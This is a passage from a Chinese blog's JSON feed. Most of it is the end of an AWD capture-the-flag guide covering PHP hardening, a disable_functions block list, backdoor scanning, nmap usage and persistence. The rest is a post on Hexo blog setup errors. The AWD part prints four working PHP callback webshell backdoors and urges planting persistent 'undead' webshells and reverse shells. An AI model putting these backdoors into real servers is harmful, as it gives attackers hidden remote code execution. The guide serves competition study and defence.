class=\"token comment\"># 从服务器下载单个文件到本地</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">scp</span> /path/local_filename username@servername:/path             <span class=\"token comment\"># 从本地上传单个文件到服务器</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> username@servername:remote_dir/ /tmp/local_dir          <span class=\"token comment\"># 从服务器下载整个目录到本地</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> /tmp/local_dir username@servername:remote_dir           <span class=\"token comment\"># 从本地上传整个目录到服务器</span></pre></td></tr></table></figure><h3 id=\"日志记录\"><a class=\"anchor\" href=\"#日志记录\">#</a> 日志记录</h3>\n<p><strong>python 文件监控脚本，<a href=\"\">传送门</a></strong></p>\n<blockquote>\n<p>/var/log/nginx/    #默认 Nginx 日志目录<br />\n /var/log/apache/   #默认 Apache 日志目录<br />\n /var/log/apache2/  #默认 Apache 日志目录<br />\n /usr/local/tomcat/logs #Tomcat 日志目录<br />\n tail -f xxx.log   #实时刷新滚动日志文件</p>\n</blockquote>\n<h3 id=\"设置htaccess禁用php脚本执行\"><a class=\"anchor\" href=\"#设置htaccess禁用php脚本执行\">#</a> 设置.htaccess 禁用 php 脚本执行</h3>\n<details class=\"info\"><summary>👇脚本点击展开</summary><div>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;Directory \"/var/www/html/upload\">   //指定目录后续的指令将应用于该目录</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Options -ExecCGI -Indexes            //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>AllowOverride None                   //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>//这两个指令移除指定文件扩展名的处理器和类型。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>php_flag engine off     //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FilesMatch</span> <span class=\"token attr-name\">\".+\\.ph(p[3457]?|t|tml)$\"</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>deny from all</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>FilesMatch</span><span class=\"token punctuation\">></span></span>  //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>Directory</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure></div></details>\n<h3 id=\"php参数安全配置\"><a class=\"anchor\" href=\"#php参数安全配置\">#</a> php 参数安全配置</h3>\n<p>在 <code>/etc/php7.2.1/php.ini</code>  下</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>禁用高危函数</strong></p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>disable_functions </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>disable_functions &#x3D; system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>配置 open_basedir</strong> （将用户访问文件的活动范围限制在指定的区域）</p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>禁用魔术引号</strong>（自动对外部来源数据进行转义，防止 SQL 注入）</p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>magic_quotes_gpc &#x3D; Off</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>关闭 PHP 伪协议</strong></p>\n</li>\n</ul>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>allow_url_fopen &#x3D; Off</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>allow_url_include &#x3D; Off</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>重启 PHP</strong></p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> php7.0-fpm restart</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> systemctl restart php7.0-fpm.service</pre></td></tr></table></figure><h3 id=\"waf部署\"><a class=\"anchor\" href=\"#waf部署\">#</a> waf 部署</h3>\n<p><a href=\"https://ctf-learner.github.io/post/AWD-waf%E8%84%9A%E6%9C%AC/\">脚本传送门</a><br />\n php.ini 选项：auto_prepend_file = 与 auto_append_file =waf.php</p>\n<p>waf 脚本，<a href=\"https://github.com/sharpleung/CTF-WAF\">项目戳这里</a>，<a href=\"http://t.csdnimg.cn/y4KoJ\"> 部署看这里</a><br />\n WatchBrid 通防不允许用于比赛，第三方通防参考比赛规则<br />\n<a href=\"https://github.com/DasSecurity-HatLab/AoiAWD\"> AoiAWD 戳这里</a><br />\n<a href=\"https://www.freebuf.com/sectool/234402.html\"> WatchBrid 防火墙戳这里</a></p>\n<h3 id=\"php代码审计\"><a class=\"anchor\" href=\"#php代码审计\">#</a> php 代码审计</h3>\n<p>扫描预留后门，扫描目录，寻找后门，注释代码<br />\n cms 框架的 cve、常见的漏洞等</p>\n<div class=\"note success\">\n<p>这部分需要进攻防守同时进行，审计出漏洞后分工，一人补 waf、注释代码，一人写脚本、写 payload<br />\n 具体放在 attack 部分讲解。</p>\n</div>\n<h3 id=\"远程登录加固\"><a class=\"anchor\" href=\"#远程登录加固\">#</a> 远程登录加固</h3>\n<p>暂时用不到，遇到再补充</p>\n<h3 id=\"设置禁ping\"><a class=\"anchor\" href=\"#设置禁ping\">#</a> 设置禁 Ping</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all     //临时开启禁ping</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"0\"</span> <span class=\"token operator\">></span> /proc/sys/net/ipv4/icmp_echo_ignore_all     //关闭禁ping</pre></td></tr></table></figure><h1 id=\"进攻attack\"><a class=\"anchor\" href=\"#进攻attack\">#</a> 进攻（attack）</h1>\n<div class=\"note danger\">\n<p>一定要在前几轮脚本批量获取分数，到后面基本上是打卡下班了</p>\n</div>\n<h2 id=\"代码审计\"><a class=\"anchor\" href=\"#代码审计\">#</a> 代码审计</h2>\n<div class=\"note warning\">\n<p>各个靶机服务相同，可以先在主机代码审计，寻找简单漏洞。由易到难。</p>\n</div>\n<p>扫描预留后门，扫描目录，寻找后门，注释代码</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 简单的查找后门 （不建议）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'eval('</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'assert('</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">find</span> <span class=\"token builtin class-name\">.</span> <span class=\"token parameter variable\">-name</span> <span class=\"token string\">'*.php'</span> <span class=\"token operator\">|</span> <span class=\"token function\">xargs</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">'system('</span></pre></td></tr></table></figure><p><span class=\"red\"><strong>推荐</strong></span><br />\n打开 D 盾 / 安全狗 / 河马查杀，将 html 文件夹直接拖入</p>\n<p>seay 源代码审计，或者 Rips 代码审计<br />\n<a href=\"https://blog.csdn.net/qq_43442524/article/details/101934481\">工具</a></p>\n<h2 id=\"metasploit工具\"><a class=\"anchor\" href=\"#metasploit工具\">#</a> Metasploit 工具</h2>\n<p><a href=\"\">插个眼</a>，后续补上</p>\n<h2 id=\"nmap扫描工具\"><a class=\"anchor\" href=\"#nmap扫描工具\">#</a> nmap 扫描工具</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/子网掩码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>  <span class=\"token comment\"># 扫描主机所有端口</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-Pn</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token parameter variable\">-A</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span></pre></td></tr></table></figure><p>这里放一些常用的 nmap 命令，更多需求<a href=\"https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/\">戳这里</a></p>\n<blockquote>\n<p>学会读官方说明文档真的很重要，比起直接看别人写好的教程，会对工具的用法有更深的理解。<a href=\"https://nmap.org/man/zh/index.html\">nmap 中文文档</a></p>\n</blockquote>\n<h2 id=\"权限维持\"><a class=\"anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<p>拿到 WEBSHELL 后，需要维持权限！简单的 WEBSHELL 一眼就会被识别，在 AWD 中优先考虑种不死马、反弹 SHELL 等留后门方式维持权限，以便后续刷 FLAG，再考虑提升权限。</p>\n<h3 id=\"关于反弹shell\"><a class=\"anchor\" href=\"#关于反弹shell\">#</a> 关于反弹 shell</h3>\n<p>怎么写怎么藏怎么发现，买了服务器再学 hhhhh🥱🥱</p>\n<h3 id=\"藏flag技术哪家强\"><a class=\"anchor\" href=\"#藏flag技术哪家强\">#</a> 藏 flag 技术哪家强</h3>\n<div class=\"note warning\">\n<p>第一次 getshell 之后不能得意，权限的维持时间有限，如果能把 flag 藏在某处持续得分才是大头任务</p>\n</div>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag:'</span><span class=\"token operator\">.</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>条件允许的话，将 flag 信息直接读取并返回到 header 头中，这样做不易被发现。</p>\n<h3 id=\"藏后门的n种方式\"><a class=\"anchor\" href=\"#藏后门的n种方式\">#</a> 藏后门的 n 种方式</h3>\n<p>直接放上 p 神的文章，膜拜一下</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html\">创造 tips 的秘籍 ——PHP 回调后门 | 离别歌 (leavesongs.com)</a></p>\n<details class=\"info\"><summary>👇整理了一下后门的脚本</summary><div>\n<p>文章发布自 2015 年，目前各大 waf 都有了修补，参考着使用吧，脚本只做搬运，认真拜读</p>\n<p><mark>单参数后门的终极奥义</mark></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">register_shutdown_function</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">declare</span><span class=\"token punctuation\">(</span>ticks<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">register_tick_function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$e</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">filter_var</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILTER_CALLBACK</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'options'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">filter_var_array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'filter'</span> <span class=\"token operator\">=></span> <span class=\"token constant\">FILTER_CALLBACK</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'options'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>过去那么久了，php 也到了 8.1 的版本，后续有空测试一下这些后门还能用不</p>\n</div></details>\n<h4 id=\"关于不死马\"><a class=\"anchor\" href=\"#关于不死马\">#</a> 关于不死马</h4>\n<p><a href=\"\">传送门</a></p>\n<p>不死马可以权限维持，并且继续往服务器写入更多的马，不要仅限于 getflag</p>\n<h1 id=\"一些批量脚本\"><a class=\"anchor\" href=\"#一些批量脚本\">#</a> 一些批量脚本</h1>\n<p>正在收集 ing~~~，等待更新</p>\n<h1 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章：</h1>\n<p><a href=\"https://forum.butian.net/share/2536\">https://forum.butian.net/share/2536</a><br />\n<a href=\"https://www.cnblogs.com/qianfu/p/17530955.html\">https://www.cnblogs.com/qianfu/p/17530955.html</a><br />\n<a href=\"http://t.csdnimg.cn/7nF7a\">http://t.csdnimg.cn/7nF7a</a><br />\n<a href=\"https://www.cnblogs.com/liang2580/p/9147806.html\">https://www.cnblogs.com/liang2580/p/9147806.html</a><br />\n<a href=\"https://github.com/AabyssZG/AWD-Guide\">https://github.com/AabyssZG/AWD-Guide</a><br />\n<a href=\"http://t.csdnimg.cn/ucKKL\">http://t.csdnimg.cn/ucKKL</a></p>\n",
            "tags": [
                "AWD",
                "Attack and Defence",
                "kali tools"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "url": "https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/",
            "title": "搭博客一路的心酸",
            "date_published": "2024-04-10T03:50:46.000Z",
            "content_html": "<p>一开始一眼相中了 shoka 主题的样式，谁料到后来搬石头砸了自己的脚。<br />\n部署到一半发现 shoka 有了升级版 shokaX，只得重新来过<br />\n随后 <code>npm install</code>  反复报错，真是头大<br />\n在配置图片时候又发现用 images.yml 的相对路径加载不到。<br />\n换了图床后 images.yml 也没加载成功……😑😰</p>\n<h1 id=\"傻掉的是我不是git-bash\"><a class=\"anchor\" href=\"#傻掉的是我不是git-bash\">#</a> 傻掉的是我，不是 git bash</h1>\n<p>第一个拦路虎就是<strong> hexo init</strong><br />\n 卡住了无数次…… 耐心不够用了，都怀疑是不是 git bash 坏掉了<br />\n最后换源再 <code>npm hexo init</code> <br />\n 长舒一口气</p>\n<p>在安装前已经修改了 nodejs 的权限问题</p>\n<h1 id=\"powershell的脚本运行问题\"><a class=\"anchor\" href=\"#powershell的脚本运行问题\">#</a> powershell 的脚本运行问题</h1>\n<p>若直接运行 hexo 会报这样的错误<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-2.png\" alt=\"err\" /></p>\n<p>设置 - 系统 - 开发者选项<br />\n &quot;允许本地 powershell 脚本在未签名的情况下允许&quot; 选择开启<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-1.png\" alt=\"设置-系统-开发者选项\" /></p>\n<h1 id=\"躲不掉的还是npm-err\"><a class=\"anchor\" href=\"#躲不掉的还是npm-err\">#</a> 躲不掉的还是 npm ERR！</h1>\n<p><img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-3.png\" alt=\"&quot;每次npm install时的噩梦&quot;\" title=\"npm ERR! Cannot read properties of null (reading 'matches')\" /><br />\n<strong>npm ERR! Cannot read properties of null (reading 'matches')</strong><br />\n 网上面对这个报错的做法是</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> cache clean <span class=\"token parameter variable\">--force</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>或者二傻子GPT说</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> <span class=\"token function\">npm</span></pre></td></tr></table></figure><p>也有的说删除 <code>package-lock.json</code>  删除 <code>node-modules</code>  的，但是没有 lock……<br />\n 尝试了换源，似乎还是没什么卵用……<br />\n 最后用 cnpm 才成功下载……💔</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> cnpm</pre></td></tr></table></figure><p>命令丢这下次好拿 (cnpm 换源的命令相同)</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\">npm</span> 官方镜像网址:   https://registry.npmjs.org/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>淘宝 NPM 镜像：     https://registry.npm.taobao.org</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>阿里云 NPM 镜像：   https://npm.aliyun.com</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>腾讯云 NPM 镜像：   https://mirrors.cloud.tencent.com/npm/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>华为云 NPM 镜像：   https://mirrors.huaweicloud.com/repository/npm/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>网易 NPM 镜像：     https://mirrors.163.com/npm/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>中国科学技术大学开源镜像站：http://mirrors.ustc.edu.cn/</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>清华大学开源镜像站：https://mirrors.tuna.tsinghua.edu.cn/</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>腾讯，华为，阿里的镜像站基本上比较全</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> config <span class=\"token builtin class-name\">set</span> registry <span class=\"token punctuation\">[</span>url<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 设置镜像仓库</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">npm</span> config get registry</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看当前镜像仓库</span></pre></td></tr></table></figure><h1 id=\"相对路径问题\"><a class=\"anchor\" href=\"#相对路径问题\">#</a> 相对路径问题</h1>\n<p>看各路 hexo 教程在说相对路径时候都一脸蒙<br />\n学 Linux 时候相对路径是./ 开头，或者绝对路径根目录 / 开头<br />\n但是教程上谈到发布文章的相对路径都是 / 开头</p>\n<blockquote>\n<p>先看看官网的解释<br />\n相对地址<br />\n默认情况下，Hexo 生成的超链接都是绝对地址。例如，如果您的网站域名为 <a href=\"http://example.com\">example.com</a>，您有一篇文章名为 hello，那么绝对链接可能像这样：&lt;<a href=\"http://example.com/hello.html%5C\">http://example.com/hello.html\\</a>&gt; ，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p>\n</blockquote>\n<p>这里相对路径其实指的网站的根目录<br />\n在 hexo g 之后生成的 public 目录会在 hexo d 部署到网站上<br />\n那么相对路径指的就是以 public 目录为起始 /<br />\n<img loading=\"lazy\" data-src=\"/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-4.png\" alt=\"public文件夹\" /><br />\n如果还是定位不到图片的地址，就把图片和文章放一起 hexo g 之后看 /public 下的位置<br />\n然后就知道图片的地址该怎么写了</p>\n<h1 id=\"imagesyml图片加载不到问题\"><a class=\"anchor\" href=\"#imagesyml图片加载不到问题\">#</a> images.yml 图片加载不到问题</h1>\n<blockquote>\n<p>官方配置文档：<a href=\"https://docs.kaitaku.xyz/guide/theme.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E7%AB%99%E8%BD%AE%E6%92%AD%E5%9B%BE\">https://docs.kaitaku.xyz/guide/theme.html# 自定义网站轮播图</a></p>\n</blockquote>\n<p>但是本地测试的时候发现，images.yml 中使用相对路径图片没有加载，于是按照文档说明，分别在</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>主题文件夹下_images_index.yml</p>\n</li>\n<li class=\"lvl-2\">\n<p>source/_data/images_index.yml</p>\n</li>\n</ul>\n<p>这些位置都<strong>没有成功</strong>加载网站背景图片。<br />\n<strong><mark>解决方案</mark></strong><br />\n直接修改 <code>主题文件夹下_images_index.yml</code> ，即 <code>/theme/shohaX/images.yml</code> 。按照官方文档 SXC 的下载方式，主题文件夹在 <code>/node_modules/hexo-theme-shokaX/images.yml</code></p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>source/_data/images.yml</p>\n</li>\n</ul>\n<blockquote>\n<p>心里话：真是给我累吐血了</p>\n</blockquote>\n<h1 id=\"nrm管理\"><a class=\"anchor\" href=\"#nrm管理\">#</a> nrm 管理</h1>\n<p>nrm 是一个 npm 源管理器，允许你快速地在 npm 源间切换</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> nrm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 安装 nrm 源管理工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nrm <span class=\"token function\">ls</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 查看可选的源</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nrm use <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 切换源</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nrm <span class=\"token builtin class-name\">test</span>     </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 测试速度</span></pre></td></tr></table></figure><h1 id=\"nvm-node多版本管理\"><a class=\"anchor\" href=\"#nvm-node多版本管理\">#</a> nvm node 多版本管理</h1>\n<p>安装和使用参考<a href=\"http://t.csdnimg.cn/B42dl\">这里</a></p>\n<blockquote>\n<p>参考链接<br />\n<a href=\"http://t.csdnimg.cn/WNDXm\"> http://t.csdnimg.cn/WNDXm</a></p>\n</blockquote>\n",
            "tags": [
                "关于shokaX",
                "daily",
                "nodejs"
            ]
        }
    ]
}